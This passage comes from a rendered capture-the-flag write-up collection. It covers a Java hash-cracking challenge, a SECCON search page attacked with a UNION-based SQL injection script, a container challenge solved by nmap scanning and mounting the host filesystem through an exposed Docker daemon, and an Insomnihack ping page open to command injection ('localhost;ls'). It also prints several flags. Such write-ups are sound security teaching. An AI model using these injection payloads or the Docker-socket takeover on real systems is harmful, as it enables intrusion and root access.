5ebb49e499a6613e832e433a2722edd0d2947d56fdb4d684af0f06c631fdf633
</code></pre><table><thead><tr><th>Algo<th>Unhashed<th>Hash<th>Lookup<tbody><tr><td><code>MD5</code><td><code>masterchief</code><td><code>d5c67e2fc5f5f155dff8da4bdc914f41</code><td><a href=https://md5hashing.net/hash/md5/d5c67e2fc5f5f155dff8da4bdc914f41>https://md5hashing.net/hash/md5/d5c67e2fc5f5f155dff8da4bdc914f41</a><tr><td><code>SHA1</code><td><code>princesspeach</code><td><code>264212deff89ade15661a59e7b632872d858f2c6</code><td><a href=https://md5hashing.net/hash/sha1/264212deff89ade15661a59e7b632872d858f2c6>https://md5hashing.net/hash/sha1/264212deff89ade15661a59e7b632872d858f2c6</a><tr><td><code>SHA-256</code><td><code>solidsnake</code><td><code>5ebb49e499a6613e832e433a2722edd0d2947d56fdb4d684af0f06c631fdf633</code><td><a href=https://md5hashing.net/hash/sha256/5ebb49e499a6613e832e433a2722edd0d2947d56fdb4d684af0f06c631fdf633>https://md5hashing.net/hash/sha256/5ebb49e499a6613e832e433a2722edd0d2947d56fdb4d684af0f06c631fdf633</a></table><p>Let's enter these values in.<pre><code class=language-bash>$ nc challenges.auctf.com 30001
Welcome to the Land of Interpreted Languages!
If you are used to doing compiled languages this might be a shock... but if you hate assembly this is the place to be!

Unfortunately, if you hate Java, this may suck...
Good luck!

Let's try some hash cracking!! I'll go easy on you the first time. The first hash we are checking is this
        d5c67e2fc5f5f155dff8da4bdc914f41
Think you can crack it? If so give me the value that hashes to that!
        masterchief
Nice work! One down, two to go ...
This next one you don't get to see, if you aren't already digging into the class file you may wanna try that out!
        princesspeach
Nice work! Here's the last one...
        solidsnake
That's correct!
auctf{If_u_h8_JAVA_and_@SM_try_c_sharp_2922}
</code></pre><h2><a class=header href=#flag-39 id=flag-39>Flag</a></h2><p><code>auctf{If_u_h8_JAVA_and_@SM_try_c_sharp_2922}</code><h1><a class=header href=#web-2 id=web-2>Web</a></h1><p>Placeholder for web resources<h1><a class=header href=#seccon19-web-search id=seccon19-web-search>SECCON19 Web Search</a></h1><p>Get a hidden message! Let's find a hidden message using the search system on the site.<p><a href=http://web-search.chal.seccon.jp/>http://web-search.chal.seccon.jp/</a><pre><code class=language-python>import requests

query = &quot;1' UNION SELECT * FROM (SELECT 10)A JOIN (SELECT @@version)B JOIN (SELECT 10)C#&quot; # 10.4.8-MariaDB-1:10.4.8+maria~bionic
query = &quot;1' UNION SELECT * FROM (SELECT 10)A JOIN (SELECT database())B JOIN (SELECT database())C#&quot; # seccon_sqli
query = &quot;1' UNION SELECT * FROM (select table_name from infoorrmation_schema.tables)A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;
#query = &quot;1' UNION SELECT * FROM (select column_name from infoorrmation_schema.columns where table_name = 'articles')A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;
#query = &quot;1' UNION SELECT * FROM (select description from articles)A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;
#query = &quot;1' UNION SELECT * FROM (select * from flag)A JOIN (SELECT 5)B JOIN (SELECT 5)C#&quot;

query = query.replace(&quot; &quot;, &quot;/**/&quot;)
q = {&quot;q&quot;: query}
res = requests.get(&quot;http://web-search.chal.seccon.jp&quot;, params=q)
print(res.text)
</code></pre><h2><a class=header href=#flag-40 id=flag-40>Flag</a></h2><p>I forgot to write the flag down here.<h1><a class=header href=#containers id=containers>Containers</a></h1><h2><a class=header href=#challenge-33 id=challenge-33>Challenge</a></h2><p>Please assess the security of our new web app. The staging environment for our new app is on: 10.0.111.[100 + your_team_number]<h2><a class=header href=#solution-40 id=solution-40>Solution</a></h2><p>We were just given an IP address, so let's see which ports are open.<pre><code class=language-bash>nmap -sV --script=http-php-version -Pn 10.0.106.6 --dns-servers 192.168.100.1

[localhost tmctf2019-finals]$ nmap -p- -Pn 10.0.111.106 --dns-servers 192.168.100.1
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 18:18 PST
Nmap scan report for 10.0.111.106
Host is up (0.00076s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
113/tcp  closed ident
8000/tcp open   http-alt
8080/tcp open   http-proxy

Nmap done: 1 IP address (1 host up) scanned in 119.35 seconds
</code></pre><p>Visiting <code>$IP:8000</code> takes us to a portal with a login page<ul><li>admin:admin combo logs us in but flag server is apparently down<li>root:root combo logs us in but flag server is apparently down<li>Attempted various types of SQL injection. Web App does not appear to be vulnerable to SQL injection attacks<li>OWASP hints at no viable exploits either</ul><p>Visiting <code>$IP:8080</code> responds with a json string <code>{"message":"page not found"}</code><ul><li>No matter which HTTP Method<li>netcat doesn't respond</ul><p>Let's find out more about these open ports, let's grab the banners.<pre><code class=language-bash>(env-py2) [localhost tmctf2019-finals]$ nmap -sV -sC -Pn 10.0.111.106 --dns-servers 192.168.6.1                         
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 21:57 PST
Nmap scan report for 10.0.111.106
Host is up (0.00054s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE    VERSION
113/tcp  closed ident
8000/tcp open   http       Ajenti http control panel
|_http-title: Quality containers - Homepage
8080/tcp open   http-proxy Docker/19.03.4 (linux)
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: application/json
|     Date: Sun, 24 Nov 2019 05:57:42 GMT
|     Content-Length: 29
|     {&quot;message&quot;:&quot;page not found&quot;}
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Api-Version: 1.40
|     Docker-Experimental: false
|     Ostype: linux
|     Server: Docker/19.03.4 (linux)
|     Date: Sun, 24 Nov 2019 05:57:42 GMT
|_    Content-Length: 0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Docker/19.03.4 (linux)
|_http-title: Site doesn't have a title (application/json).
</code></pre><p>Turns out port 8080 is a docker proxy. If that's an open Docker daemon socket, we could use it to run containers with root access on the host. Let's try.<pre><code class=language-bash>(env-py2) [localhost tmctf2019-finals]$ DOCKER_HOST=tcp://10.0.111.106:8080 docker run -it -v /:/app ubuntu:latest
</code></pre><p>It worked, so let's do an exhaustive search for the flag.<pre><code class=language-bash>$&gt; grep -ir &quot;TMCTF&quot; /
/home/ctf/container-bridge/populate.py:    flag = 'TMCTF{muggedby2candies!}'
</code></pre><h2><a class=header href=#flag-41 id=flag-41>Flag</a></h2><p><code>TMCTF{muggedby2candies!}</code><h1><a class=header href=#insctf20q-lowdeep id=insctf20q-lowdeep>INSCTF20Q LowDeep</a></h1><h2><a class=header href=#challenge-34 id=challenge-34>Challenge</a></h2><p>Try out our new ping platform: <a href=http://lowdeep.insomnihack.ch>http://lowdeep.insomnihack.ch</a>. (Note: Only works with HTTP)<h2><a class=header href=#solution-41 id=solution-41>Solution</a></h2><p><img src=ctf/web/assets/lowdeep.insomnihack.ch.webp alt=lowdeep.insomnihack.ch.webp title=lowdeep.insomnihack.ch.webp><p><img src=ctf/web/assets/lowdeep.insomnihack.ch1.webp alt=lowdeep.insomnihack.ch1.webp title=lowdeep.insomnihack.ch1.webp><p>Interesting, it allows ips and hostnames. It behaves like ping itself. Maybe we need to try a Remote Code Execution attack here.<p>Let's see if it attempts to interpret other commands with: <code>localhost;ls</code><p><img src=ctf/web/assets/lowdeep.insomnihack.ch2.webp alt=lowdeep.insomnihack.ch2.webp title=lowdeep.insomnihack.ch2.webp><p><img src=ctf/web/assets/lowdeep.insomnihack.ch3.webp alt=lowdeep.insomnihack.ch3.webp title=lowdeep.insomnihack.ch3.webp><p>Unfortunately, we can't just use <code>cat</code>.<p><img src=ctf/web/assets/lowdeep.insomnihack.ch4.webp alt=lowdeep.insomnihack.ch4.webp title=lowdeep.insomnihack.ch4.webp><p>So let's visit the page instead: <a href=http://lowdeep.insomnihack.ch/print-flag>http://lowdeep.insomnihack.ch/print-flag</a><p>And we get the following file: <img src=ctf/web/assets/print-flag alt=print-flag><pre><code class=language-bash>$ file print-flag
print-flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=72c589834f878a6a3267944f305c29166a1ace8b, stripped
$ chmod +x print-flag
$ ./print-flag
INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}
</code></pre><h2><a class=header href=#flag-42 id=flag-42>Flag</a></h2><p><code>INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}</code></main><nav class=nav-wrapper aria-label="Page navigation"><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"></nav></div><script>window.playground_copyable=!0</script><script src=elasticlunr.min.js></script><script src=mark.min.js></script><script src=searcher.js></script><script src=clipboard.min.js></script><script src=highlight.js></script><script src=book.js></script><script src=theme/mermaid.js></script><script>window.addEventListener('load',function(){window.setTimeout(window.print,100)})</script>